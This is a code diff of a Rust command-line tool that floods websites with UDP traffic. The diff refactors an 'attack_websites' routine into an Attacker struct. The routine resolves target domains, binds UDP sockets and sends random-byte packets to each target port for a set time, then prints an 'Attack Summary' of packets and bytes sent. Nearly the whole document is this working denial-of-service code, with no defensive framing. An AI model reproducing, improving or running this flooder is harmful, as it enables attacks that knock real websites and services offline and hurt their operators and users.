@@ -3,6 +3,7 @@ extern crate log;
 
 extern crate pretty_env_logger;
 
+use std::collections::HashMap;
 use std::{
     fmt::{Debug, Display, Formatter},
     fs::File,
@@ -16,7 +17,6 @@ use std::{
 use anyhow::*;
 use dns_lookup::lookup_host;
 use itertools::Itertools;
-use lazy_static::lazy_static;
 use online::sync::check;
 use portpicker::pick_unused_port;
 use rand::{thread_rng, RngCore};
@@ -241,183 +241,18 @@ impl Debug for WebsiteConfig {
 }
 // ----- Website Configuration END -----
 
-// ----- Attack Websites START -----
-fn attack_websites(config: Config, website_configs: Vec<WebsiteConfig>) -> Result<()> {
-    info!("Starting attack on the websites...");
-
-    let start = Instant::now();
-
-    let socket_addresses = Arc::new(Mutex::new(vec![]));
-
-    website_configs.par_iter().for_each(|website_config| {
-        if !website_config.is_domain {
-            website_config.ports.par_iter().for_each(|port| {
-                (*socket_addresses).lock().unwrap().push(format!(
-                    "{}:{}",
-                    website_config.address,
-                    port.clone()
-                ));
-            });
-        } else {
-            if let std::result::Result::Ok(ips) = lookup_host(&website_config.address) {
-                ips.par_iter().for_each(|ip| {
-                    website_config.ports.par_iter().for_each(|port| {
-                        (*socket_addresses)
-                            .lock()
-                            .unwrap()
-                            .push(format!("{}:{}", ip, port));
-                    });
-                });
-            } else {
-                error!(
-                    "Couldn't find ips for the domain {}",
-                    website_config.address
-                );
-            }
-        }
-    });
-
-    let socket_addresses = (*socket_addresses)
-        .lock()
-        .unwrap()
-        .clone()
-        .into_iter()
-        .unique()
-        .collect::<Vec<_>>();
-
-    socket_addresses.par_iter().for_each(|socket_address| {
-        let sender: SocketAddr = format!(
-            "0.0.0.0:{}",
-            pick_unused_port().expect("No free port found!")
-        )
-        .parse()
-        .expect("Couldn't get sender IP address");
-
-        info!("Creating socket for {} ...", sender);
-
-        let socket = UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));
-
-        let mut summary_added = false;
-
-        while start.elapsed().as_secs() < config.execution_time {
-            match socket.connect(socket_address.clone()) {
-                std::result::Result::Ok(_) => {
-                    if config.summary && !summary_added {
-                        summary_added = true;
-
-                        let mut summary = (*SUMMARY).lock().unwrap();
-
-                        if summary
-                            .iter()
-                            .position(|s| &s.socket_address == socket_address)
-                            .is_none()
-                        {
-                            summary.push(PacketSummary {
-                                socket_address: socket_address.clone(),
-                                ..Default::default()
-                            })
-                        }
-                    }
-
-                    let buffer = generate_buffer(config.packet_size);
-
-                    while start.elapsed().as_secs() < config.execution_time {
-                        let res = socket.send(buffer.as_slice());
-
-                        match res {
-                            std::result::Result::Ok(size) => {
-                                info!(
-                                    "Successfully sent a packet of size {} to {}",
-                                    size, socket_address
-                                );
-
-                                if config.summary {
-                                    let mut summary = (*SUMMARY).lock().unwrap();
-
-                                    if let Some(index) = summary
-                                        .iter()
-                                        .position(|s| &s.socket_address == socket_address)
-                                    {
-                                        summary[index].size += size as u128;
-                                        summary[index].amount += 1;
-                                    }
-                                }
-                            }
-                            std::result::Result::Err(error) => {
-                                error!(
-                                    "Failed to send a packet to {} .\nError message: {}",
-                                    socket_address, error
-                                );
-
-                                if config.unreachable_stop_trying {
-                                    break;
-                                }
-                            }
-                        }
-
-                        sleep(config.timeout);
-                    }
-                }
-                std::result::Result::Err(error) => {
-                    error!(
-                        "Couldn't connect to {}.\nError message: {}",
-                        socket_address, error
-                    );
-
-                    break;
-                }
-            }
-        }
-    });
-
-    Ok(())
-}
-
-fn generate_buffer(size: usize) -> Vec<u8> {
-    let mut buffer = Vec::with_capacity(size);
-    unsafe {
-        buffer.set_len(size);
-    }
-
-    thread_rng().fill_bytes(buffer.as_mut_slice());
-
-    buffer
-}
-// ----- Attack Websites END -----
-
 // ----- Attack Summary START -----
 #[derive(Default, Clone)]
 struct PacketSummary {
-    socket_address: String,
     amount: u128,
     size: u128,
 }
 
 impl PacketSummary {
-    pub fn show_summary(summary: Vec<PacketSummary>) {
-        info!("~~~~~~~ Attack Summary START ~~~~~~~");
-        let mut sum_packets = 0;
-        let mut sum_packet_size = 0;
-
-        for packet_summary in summary {
-            sum_packets += packet_summary.amount;
-            sum_packet_size += packet_summary.size;
-
-            packet_summary.show();
-        }
-
-        info!(
-            "Sum Packets Sent: {}, Sum Packets Size: {}",
-            sum_packets,
-            Self::packet_size_output(sum_packet_size)
-        );
-        info!("~~~~~~~ Attack Summary END ~~~~~~~");
-    }
-
-    pub fn show(&self) {
+    pub fn show(&self, socket_address: &str) {
         info!(
             "Socket Address: {}, Packets Sent: {}, Sum Packet Size: {}B",
-            self.socket_address,
+            socket_address,
             self.amount,
             Self::packet_size_output(self.size)
         );
@@ -441,11 +276,169 @@ impl PacketSummary {
         output
     }
 }
-
-lazy_static! {
-    static ref SUMMARY: Arc<Mutex<Vec<PacketSummary>>> = Arc::new(Mutex::new(Vec::new()));
-}
 // ----- Attack Summary END -----
+
+// ----- Attack Websites START -----
+struct Attacker {
+    pub config: Config,
+    pub website_configs: Vec<WebsiteConfig>,
+    pub summary: Arc<Mutex<HashMap<String, PacketSummary>>>,
+}
+
+impl Attacker {
+    pub fn attack_websites(&self) {
+        info!("Starting attack on the websites...");
+
+        let start = Instant::now();
+
+        let socket_addresses = Arc::new(Mutex::new(vec![]));
+
+        self.website_configs.par_iter().for_each(|website_config| {
+            if !website_config.is_domain {
+                website_config.ports.par_iter().for_each(|port| {
+                    (*socket_addresses).lock().unwrap().push(format!(
+                        "{}:{}",
+                        website_config.address,
+                        port.clone()
+                    ));
+                });
+            } else {
+                if let std::result::Result::Ok(ips) = lookup_host(&website_config.address) {
+                    ips.par_iter().for_each(|ip| {
+                        website_config.ports.par_iter().for_each(|port| {
+                            (*socket_addresses)
+                                .lock()
+                                .unwrap()
+                                .push(format!("{}:{}", ip, port));
+                        });
+                    });
+                } else {
+                    error!(
+                        "Couldn't find ips for the domain {}",
+                        website_config.address
+                    );
+                }
+            }
+        });
+
+        let socket_addresses = (*socket_addresses)
+            .lock()
+            .unwrap()
+            .clone()
+            .into_iter()
+            .unique()
+            .collect::<Vec<_>>();
+
+        socket_addresses.par_iter().for_each(|socket_address| {
+            let sender: SocketAddr = format!(
+                "0.0.0.0:{}",
+                pick_unused_port().expect("No free port found!")
+            )
+            .parse()
+            .expect("Couldn't get sender IP address");
+
+            info!("Creating socket for {} ...", sender);
+
+            let socket =
+                UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));
+
+            let mut summary_added = false;
+
+            while start.elapsed().as_secs() < self.config.execution_time {
+                match socket.connect(socket_address.clone()) {
+                    std::result::Result::Ok(_) => {
+                        if self.config.summary && !summary_added {
+                            summary_added = true;
+
+                            (*self.summary)
+                                .lock()
+                                .unwrap()
+                                .insert(socket_address.clone(), PacketSummary::default());
+                        }
+
+                        let buffer = self.generate_buffer();
+
+                        let res = socket.send(buffer.as_slice());
+
+                        match res {
+                            std::result::Result::Ok(size) => {
+                                info!(
+                                    "Successfully sent a packet of size {} to {}",
+                                    size, socket_address
+                                );
+
+                                if self.config.summary {
+                                    if let Some(summary) =
+                                        (*self.summary).lock().unwrap().get_mut(socket_address)
+                                    {
+                                        summary.size += size as u128;
+                                        summary.amount += 1;
+                                    }
+                                }
+                            }
+                            std::result::Result::Err(error) => {
+                                error!(
+                                    "Failed to send a packet to {} .\nError message: {}",
+                                    socket_address, error
+                                );
+
+                                if self.config.unreachable_stop_trying {
+                                    break;
+                                }
+                            }
+                        }
+
+                        sleep(self.config.timeout);
+                    }
+                    std::result::Result::Err(error) => {
+                        error!(
+                            "Couldn't connect to {}.\nError message: {}",
+                            socket_address, error
+                        );
+
+                        break;
+                    }
+                }
+            }
+        });
+
+        if self.config.summary {
+            self.show_summary()
+        }
+    }
+
+    fn generate_buffer(&self) -> Vec<u8> {
+        let mut buffer = Vec::with_capacity(self.config.packet_size);
+        unsafe {
+            buffer.set_len(self.config.packet_size);
+        }
+
+        thread_rng().fill_bytes(buffer.as_mut_slice());
+
+        buffer
+    }
+
+    fn show_summary(&self) {
+        info!("~~~~~~~ Attack Summary START ~~~~~~~");
+        let mut sum_packets = 0;
+        let mut sum_packet_size = 0;
+
+        for (socket_address, packet_summary) in (*self.summary).lock().unwrap().iter() {
+            sum_packets += packet_summary.amount;
+            sum_packet_size += packet_summary.size;
+
+            packet_summary.show(socket_address);
+        }
+
+        info!(
+            "Sum Packets Sent: {}, Sum Packets Size: {}",
+            sum_packets,
+            PacketSummary::packet_size_output(sum_packet_size)
+        );
+        info!("~~~~~~~ Attack Summary END ~~~~~~~");
+    }
+}
+// ----- Attack Websites END -----
 
 fn main() -> Result<()> {
     std::env::set_var("RUST_LOG", "info");
@@ -464,11 +457,13 @@ fn main() -> Result<()> {
     let config = Config::load()?;
     let website_configs = WebsiteConfig::load_configs(&config)?;
 
-    attack_websites(config.clone(), website_configs)?;
+    let attacker = Attacker {
+        config,
+        website_configs,
+        summary: Arc::new(Mutex::new(HashMap::new())),
+    };
 
-    if config.summary {
-        PacketSummary::show_summary((*SUMMARY).lock().unwrap().clone());
-    }
+    attacker.attack_websites();
 
     Ok(())
 }
